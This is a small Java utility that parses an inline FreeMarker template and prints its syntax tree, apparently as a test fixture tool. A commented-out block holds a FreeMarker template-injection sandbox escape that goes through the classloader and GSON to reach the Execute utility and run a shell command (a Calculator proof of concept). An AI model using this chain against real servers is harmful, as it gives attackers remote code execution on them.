package io.freemarker.astdump;

import freemarker.template.Configuration;
import freemarker.template.Template;

import java.io.StringReader;

/**
 * Parse a fixed inline template string and print AST output only.
 */
public final class AstFixtureCompareMain {
    private AstFixtureCompareMain() {
    }

    public static void main(String[] args) {
        try {
//            String ftl = "<#assign classLoader=object?api.class.protectionDomain.classLoader>"+
//                    "<#assign clazz=classLoader.loadClass(\"ClassExposingGSON\")>"+
//                    "<#assign field=clazz?abs.getField(\"GSON\")>"+
//                    "<#assign gson=field?api.get(null)>"+
//                    "<#assign ex=gson?api.fromJson(\"{}\", classLoader.loadClass(\"freemarker.template.utility.Execute\"))>"+
//                    "${ex(\"open -a Calculator.app\")};";

            String ftl="1 ${x?filter(x -> !x)}";
            ftl = normalizeLineBreaks(ftl);

            Configuration cfg = new Configuration(Configuration.VERSION_2_3_34);
            cfg.setWhitespaceStripping(false);
            Template template = new Template("inline-src", new StringReader(ftl), cfg);

            AstTreePrinter printer = new AstTreePrinter();
            String actual = normalizeLineBreaks(printer.print(template)).trim();
            System.out.println(actual);
        } catch (Exception e) {
            System.err.println("Print failed: " + e.getMessage());
            e.printStackTrace(System.err);
            System.exit(2);
        }
    }

    private static String normalizeLineBreaks(String s) {
        return s.replace("\r\n", "\n").replace('\r', '\n');
    }
}
